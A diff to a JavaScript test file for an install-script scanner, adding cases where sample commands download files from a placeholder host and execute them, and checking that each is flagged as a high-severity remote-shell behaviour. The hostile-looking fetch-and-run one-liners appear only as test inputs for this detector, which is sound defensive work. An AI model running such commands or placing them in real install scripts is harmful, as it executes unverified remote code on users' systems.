@@ -175,6 +175,26 @@ test("common remote-shell idioms are HIGH; plain downloads stay review", () => {
       "behavior-install-remote-shell",
       interpreter,
     ]);
+  for (const [script, file] of [
+    [
+      "curl -s https://x.invalid/j -o jsextension && chmod +x jsextension && ./jsextension -k",
+      "jsextension",
+    ],
+    ["wget https://x.invalid/i.sh -O i.sh; bash i.sh", "i.sh"],
+    ["curl https://x.invalid/a > a.js && node a.js", "a.js"],
+    ["curl https://x.invalid/s.exe -o s.exe & s.exe /q", "s.exe"],
+  ]) {
+    const [signal] = scriptSignals(script).signals;
+    assert.equal(signal.ruleId, "behavior-install-remote-shell", script);
+    assert.equal(signal.interpreter, "downloaded-file");
+    assert.equal(signal.file, file);
+  }
+  assert.deepEqual(
+    rule(
+      "curl -o vendor/tool.tgz https://x.invalid/t.tgz && tar xzf vendor/tool.tgz && node scripts/check.js",
+    ),
+    [["behavior-install-network-fetch", undefined]],
+  );
   assert.deepEqual(rule("curl -o out.tgz https://x.invalid/a.tgz | tee log"), [
     ["behavior-install-network-fetch", undefined],
   ]);
